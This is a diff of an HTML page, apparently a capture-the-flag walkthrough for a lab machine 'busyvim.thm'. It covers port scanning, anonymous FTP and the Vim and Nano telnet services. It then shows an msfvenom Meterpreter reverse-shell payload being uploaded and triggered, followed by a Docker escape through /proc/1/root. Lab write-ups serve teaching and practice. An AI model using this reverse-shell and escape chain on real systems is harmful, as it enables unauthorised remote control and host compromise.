@@ -122,124 +122,124 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<div class="codehilite"><pre><span></span><code><span class="n">Reconnaissance</span>
-<span class="mf">1.</span><span class="w"> </span><span class="n">Port</span><span class="w"> </span><span class="n">Scanning</span>
+<pre class="codehilite"><code>Reconnaissance
+1. Port Scanning
 
-<span class="n">A</span><span class="w"> </span><span class="n">full</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">reveals</span><span class="w"> </span><span class="n">several</span><span class="w"> </span><span class="n">interesting</span><span class="w"> </span><span class="n">services</span><span class="o">.</span>
-<span class="n">Bash</span>
+A full port scan reveals several interesting services.
+Bash
 
-<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span>
+nmap -Pn -p- busyvim.thm
 
-<span class="n">Port</span><span class="w">    </span><span class="n">Service</span><span class="w"> </span><span class="n">Description</span>
-<span class="mi">22</span><span class="w">  </span><span class="n">SSH</span><span class="w"> </span><span class="n">Requires</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">private</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">(</span><span class="n">currently</span><span class="w"> </span><span class="n">inaccessible</span><span class="p">)</span><span class="o">.</span>
-<span class="mi">80</span><span class="w">  </span><span class="n">HTTP</span><span class="w">    </span><span class="n">WebSocket</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Web</span><span class="w"> </span><span class="n">interface</span><span class="o">.</span>
-<span class="mi">8075</span><span class="w">    </span><span class="n">FTP</span><span class="w"> </span><span class="n">BusyBox</span><span class="w"> </span><span class="n">ftpd</span><span class="w"> </span><span class="p">(</span><span class="n">Allows</span><span class="w"> </span><span class="n">anonymous</span><span class="w"> </span><span class="n">login</span><span class="p">)</span><span class="o">.</span>
-<span class="mi">8085</span><span class="w">    </span><span class="n">Telnet</span><span class="w">  </span><span class="n">Drops</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Vim</span><span class="w"> </span><span class="n">editor</span><span class="o">.</span>
-<span class="mi">8095</span><span class="w">    </span><span class="n">Telnet</span><span class="w">  </span><span class="n">Drops</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Nano</span><span class="w"> </span><span class="n">editor</span><span class="o">.</span>
-<span class="mi">8065</span><span class="w">    </span><span class="n">Telnet</span><span class="w">  </span><span class="n">Trigger</span><span class="w"> </span><span class="n">Port</span><span class="p">:</span><span class="w"> </span><span class="n">Executes</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">frosty</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="n">upon</span><span class="w"> </span><span class="n">connection</span><span class="o">.</span>
-<span class="mf">2.</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">Enumeration</span><span class="w"> </span><span class="p">(</span><span class="n">Flag</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+Port    Service Description
+22  SSH Requires a private key (currently inaccessible).
+80  HTTP    WebSocket / Web interface.
+8075    FTP BusyBox ftpd (Allows anonymous login).
+8085    Telnet  Drops the user into a Vim editor.
+8095    Telnet  Drops the user into a Nano editor.
+8065    Telnet  Trigger Port: Executes /usr/frosty/sh upon connection.
+2. FTP Enumeration (Flag 1)
 
-<span class="n">Anonymous</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">enabled</span><span class="o">.</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">grab</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">flag</span><span class="o">.</span>
-<span class="n">Bash</span>
+Anonymous login is enabled. Connect to grab the first flag.
+Bash
 
-<span class="n">ftp</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="mi">8075</span>
-<span class="c1"># Login as anonymous</span>
-<span class="n">get</span><span class="w"> </span><span class="n">flag</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="mf">4.</span><span class="n">txt</span>
-<span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="mf">4.</span><span class="n">txt</span>
+ftp busyvim.thm 8075
+# Login as anonymous
+get flag-1-of-4.txt
+cat flag-1-of-4.txt
 
-<span class="n">II</span><span class="o">.</span><span class="w"> </span><span class="n">Initial</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Flag</span><span class="w"> </span><span class="mi">2</span>
-<span class="mf">1.</span><span class="w"> </span><span class="n">Vim</span><span class="w"> </span><span class="n">Environment</span><span class="w"> </span><span class="p">(</span><span class="n">Flag</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
+II. Initial Access &amp; Flag 2
+1. Vim Environment (Flag 2)
 
-<span class="n">Connecting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Vim</span><span class="w"> </span><span class="n">instance</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">8085</span><span class="w"> </span><span class="n">allows</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">environment</span><span class="w"> </span><span class="n">variables</span><span class="o">.</span>
-<span class="n">Bash</span>
+Connecting to the Vim instance on port 8085 allows us to query environment variables.
+Bash
 
-<span class="n">telnet</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="mi">8085</span>
+telnet busyvim.thm 8085
 
-<span class="n">Inside</span><span class="w"> </span><span class="n">Vim</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">second</span><span class="w"> </span><span class="n">flag</span><span class="p">:</span>
-<span class="n">Vim</span><span class="w"> </span><span class="n">Script</span>
+Inside Vim, type the following to see the second flag:
+Vim Script
 
-<span class="p">:</span><span class="n">echo</span><span class="w"> </span><span class="o">$</span><span class="n">FLAG2</span>
+:echo $FLAG2
 
-<span class="mf">2.</span><span class="w"> </span><span class="n">Identifying</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Restriction</span>
+2. Identifying the Restriction
 
-<span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">try</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">spawn</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="p">:</span><span class="n">shell</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="p">:</span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">fails</span><span class="w"> </span><span class="n">with</span><span class="p">:</span><span class="w"> </span><span class="n">Cannot</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">indicates</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">container</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">missing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">working</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">pointed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">existent</span><span class="w"> </span><span class="n">binary</span><span class="o">.</span>
-<span class="n">III</span><span class="o">.</span><span class="w"> </span><span class="n">Privilege</span><span class="w"> </span><span class="n">Escalation</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Reverse</span><span class="w"> </span><span class="n">Shell</span>
+If you try to spawn a shell with :shell or :!/bin/bash, it fails with: Cannot execute shell /tmp/sh This indicates the container is missing a working shell or the path is pointed to a non-existent binary.
+III. Privilege Escalation &amp; Reverse Shell
 
-<span class="n">The</span><span class="w"> </span><span class="n">goal</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">overwrite</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">frosty</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">8065</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">specific</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">someone</span><span class="w"> </span><span class="n">connects</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">it</span><span class="o">.</span>
-<span class="mf">1.</span><span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Payload</span>
+The goal is to overwrite /usr/frosty/sh with a malicious payload because port 8065 executes that specific file when someone connects to it.
+1. Create the Payload
 
-<span class="n">On</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">Kali</span><span class="w"> </span><span class="n">machine</span><span class="p">,</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">shell</span><span class="p">:</span>
-<span class="n">Bash</span>
+On your Kali machine, generate an ELF reverse shell:
+Bash
 
-<span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=&lt;</span><span class="n">YOUR_IP</span><span class="o">&gt;</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">elf</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">elf</span>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;YOUR_IP&gt; LPORT=4444 -f elf -o payload.elf
 
-<span class="mf">2.</span><span class="w"> </span><span class="n">Upload</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Payload</span>
+2. Upload the Payload
 
-<span class="n">Upload</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">FTP</span><span class="p">:</span>
-<span class="n">Bash</span>
+Upload the binary to the target via FTP:
+Bash
 
-<span class="n">ftp</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="mi">8075</span>
-<span class="n">put</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">elf</span>
+ftp busyvim.thm 8075
+put payload.elf
 
-<span class="mf">3.</span><span class="w"> </span><span class="n">Overwrite</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Trigger</span><span class="w"> </span><span class="n">Script</span>
+3. Overwrite the Trigger Script
 
-<span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Nano</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="p">(</span><span class="n">Port</span><span class="w"> </span><span class="mi">8095</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">move</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">trigger</span><span class="w"> </span><span class="n">location</span><span class="o">.</span>
+Connect to the Nano service (Port 8095) to move the binary to the trigger location.
 
-<span class="w">    </span><span class="n">telnet</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="mi">8095</span>
+    telnet busyvim.thm 8095
 
-<span class="w">    </span><span class="n">Press</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">+</span><span class="n">R</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">payload</span><span class="o">.</span><span class="n">elf</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">hit</span><span class="w"> </span><span class="n">Enter</span><span class="o">.</span>
+    Press Ctrl+R, type /tmp/ftp/payload.elf, and hit Enter.
 
-<span class="w">    </span><span class="n">Press</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">+</span><span class="n">O</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">frosty</span><span class="o">/</span><span class="n">sh</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">hit</span><span class="w"> </span><span class="n">Enter</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">overwrite</span><span class="o">.</span>
+    Press Ctrl+O, type /usr/frosty/sh, and hit Enter to overwrite.
 
-<span class="w">    </span><span class="n">Press</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">+</span><span class="n">X</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">exit</span><span class="o">.</span>
+    Press Ctrl+X to exit.
 
-<span class="mf">4.</span><span class="w"> </span><span class="n">Catch</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Shell</span>
+4. Catch the Shell
 
-<span class="n">Start</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">Metasploit</span><span class="p">:</span>
-<span class="n">Bash</span>
+Start a listener in Metasploit:
+Bash
 
-<span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
-<span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
-<span class="n">set</span><span class="w"> </span><span class="n">LHOST</span><span class="w"> </span><span class="o">&lt;</span><span class="n">YOUR_IP</span><span class="o">&gt;</span>
-<span class="n">run</span>
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST &lt;YOUR_IP&gt;
+run
 
-<span class="n">In</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">terminal</span><span class="p">,</span><span class="w"> </span><span class="n">trigger</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="p">:</span>
-<span class="n">Bash</span>
+In a new terminal, trigger the payload:
+Bash
 
-<span class="n">telnet</span><span class="w"> </span><span class="n">busyvim</span><span class="o">.</span><span class="n">thm</span><span class="w"> </span><span class="mi">8065</span>
+telnet busyvim.thm 8065
 
-<span class="n">You</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Meterpreter</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">inside</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">container</span><span class="o">.</span>
-<span class="n">IV</span><span class="o">.</span><span class="w"> </span><span class="n">Flag</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">Container</span><span class="w"> </span><span class="n">Root</span><span class="p">)</span>
+You should now have a Meterpreter session as root inside the container.
+IV. Flag 3 (Container Root)
 
-<span class="n">Inside</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">Meterpreter</span><span class="w"> </span><span class="n">session</span><span class="p">:</span>
-<span class="n">Bash</span>
+Inside your Meterpreter session:
+Bash
 
-<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="mf">4.</span><span class="n">txt</span>
+cat /root/flag-3-of-4.txt
 
-<span class="n">V</span><span class="o">.</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">Escape</span><span class="w"> </span><span class="p">(</span><span class="n">Flag</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">YetiKey</span><span class="p">)</span>
+V. Docker Escape (Flag 4 &amp; YetiKey)
 
-<span class="n">The</span><span class="w"> </span><span class="n">container</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">misconfigured</span><span class="p">,</span><span class="w"> </span><span class="n">allowing</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">processes</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="w"> </span><span class="n">directory</span><span class="o">.</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">host</span><span class="s1">&#39;s filesystem by traversing the root symbolic link of a host process.</span>
-<span class="mf">1.</span><span class="w"> </span><span class="n">Finding</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Escape</span><span class="w"> </span><span class="n">Path</span>
+The container is misconfigured, allowing us to see host processes through the /proc directory. We can access the host's filesystem by traversing the root symbolic link of a host process.
+1. Finding the Escape Path
 
-<span class="n">Since</span><span class="w"> </span><span class="n">standard</span><span class="w"> </span><span class="n">shells</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">unstable</span><span class="p">,</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">Meterpreter</span><span class="s1">&#39;s ls to find a valid host process (usually PID 1 or 1266).</span>
-<span class="n">Bash</span>
+Since standard shells might be unstable, use Meterpreter's ls to find a valid host process (usually PID 1 or 1266).
+Bash
 
-<span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">/</span>
+ls /proc/1/root/root/
 
-<span class="mf">2.</span><span class="w"> </span><span class="n">Capturing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Final</span><span class="w"> </span><span class="n">Flags</span>
+2. Capturing the Final Flags
 
-<span class="n">Once</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">flag</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="mf">4.</span><span class="n">txt</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">yetikey3</span><span class="o">.</span><span class="n">txt</span><span class="p">,</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="n">directly</span><span class="p">:</span>
+Once you see the files flag-4-of-4.txt and yetikey3.txt, read them directly:
 
-<span class="n">Flag</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="p">(</span><span class="n">Host</span><span class="w"> </span><span class="n">Root</span><span class="p">):</span>
-<span class="n">Bash</span>
+Flag 4 (Host Root):
+Bash
 
-<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="mf">4.</span><span class="n">txt</span>
+cat /proc/1/root/root/flag-4-of-4.txt
 
-<span class="n">YetiKey</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">Host</span><span class="w"> </span><span class="n">Root</span><span class="p">):</span>
-<span class="n">Bash</span>
+YetiKey 3 (Host Root):
+Bash
 
-<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">yetikey3</span><span class="o">.</span><span class="n">txt</span>
-</code></pre></div>
+cat /proc/1/root/root/yetikey3.txt
+</code></pre>
         </div>
     </main>
 
